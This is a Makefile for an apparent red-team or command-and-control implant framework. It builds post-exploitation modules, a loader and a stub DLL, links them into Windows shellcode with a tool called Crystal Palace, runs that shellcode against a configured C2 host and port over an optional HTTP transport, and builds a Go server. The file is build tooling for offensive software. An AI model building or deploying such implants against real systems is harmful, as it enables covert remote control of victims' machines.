# =============================================================================
# Demo Agent — Module Framework Demo (whoami, pwd, hostname, ps)
# =============================================================================

ROOT := ..
include $(ROOT)/common.mk

.PHONY: all shellcode runner run debug http http-debug clean

all: shellcode runner

libs: $(BIN)
	$(call build_core_libs)
	@$(CC_64) -DWIN_X64 $(CFLAGS) \
		-c $(AGENT_SRC)/modules.c -o $(BIN)/modules.x64.o
	@$(CC_64) -DWIN_X64 $(CFLAGS) \
		-c demo_postex.c -o $(BIN)/demo_postex.x64.o
	$(call zip_mergelib,modules)
	$(call zip_mergelib,demo_postex)
	@echo "    modules: $$(wc -c < $(BIN)/modules.x64.o)b  postex: $$(wc -c < $(BIN)/demo_postex.x64.o)b"

objects: $(BIN)
	@echo "[1/4] Compiling COFF objects [$(TRANSPORT)] ($(C2_HOST):$(C2_PORT))"
	$(call build_loader)
	@$(CC_64) -DWIN_X64 $(CFLAGS) -c pico_combined.c -o $(BIN)/demo_pico.x64.o
	@echo "    loader: $$(wc -c < $(BIN)/loader.x64.o)b  pico: $$(wc -c < $(BIN)/demo_pico.x64.o)b"

dll: $(BIN)
	$(call build_stub)

shellcode: libs objects dll
	@echo "[3/4] Crystal Palace link"
	@$(CPL) link loader.spec $(BIN)/stub.x64.dll $(BIN)/demo.x64.bin
	@echo "    Shellcode: $$(wc -c < $(BIN)/demo.x64.bin) bytes"

runner: $(BIN)
	$(call build_runner)

run: shellcode runner
	@echo "=== Running demo [$(TRANSPORT)] → $(C2_HOST):$(C2_PORT) ==="
	@$(BIN)/run.x64.exe $(BIN)/demo.x64.bin

debug: CFLAGS += -DAGENT_DEBUG
debug: shellcode runner

http: CFLAGS += -DTRANSPORT_HTTP
http: TRANSPORT := http
http: shellcode runner

http-debug: CFLAGS += -DAGENT_DEBUG -DTRANSPORT_HTTP
http-debug: TRANSPORT := http
http-debug: shellcode runner

server:
	@cd $(ROOT)/server && go build -o $(ROOT)/bin/server .

clean:
	rm -f $(BIN)/demo*.o $(BIN)/demo*.bin
	rm -f $(BIN)/modules.x64.o $(BIN)/demo_postex.x64.o
	rm -f $(BIN)/libmodules.x64.zip $(BIN)/libdemo_postex.x64.zip
